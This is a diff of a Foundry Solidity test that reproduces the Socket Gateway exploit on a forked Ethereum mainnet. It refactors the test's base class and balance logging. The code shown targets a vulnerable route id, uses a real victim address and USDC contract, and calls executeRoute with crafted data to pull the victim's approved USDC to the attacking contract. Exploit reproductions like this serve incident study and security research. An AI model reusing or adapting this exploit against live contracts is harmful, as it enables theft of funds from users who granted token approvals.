@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 interface ISocketGateway {
@@ -34,11 +34,12 @@ interface ISocketVulnRoute {
 // Twitter Guy : https://twitter.com/peckshield/status/1747353782004900274
 
 //In this example i didnt do a batch transferfrom for multiple target addresses,just did one for simplicity
-contract SocketGatewayExp is Test {
+contract SocketGatewayExp is BaseTestWithBalanceLog {
     address _gateway = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
-    uint32 routeId = 406; //Recently added vulnerable route id
-    address targetUser = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;
     address _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+
+    address targetUser = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;
+    uint32 routeId = 406; //Recently added vulnerable route id
 
     ISocketGateway gateway = ISocketGateway(_gateway);
     IERC20 USDC = IERC20(_usdc);
@@ -48,6 +49,7 @@ contract SocketGatewayExp is Test {
     function setUp() public {
         vm.createSelectFork("mainnet", 19_021_453);
         USDC.approve(_gateway, type(uint256).max);
+        fundingToken = _usdc;
     }
 
     function getCallData(address token, address user) internal view returns (bytes memory callDataX) {
@@ -68,7 +70,7 @@ contract SocketGatewayExp is Test {
         );
     }
 
-    function testExploit() public {
+    function testExploit() public balanceLog {
         gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));
         require(USDC.balanceOf(address(this)) > 0, "no usdc gotten");
     }
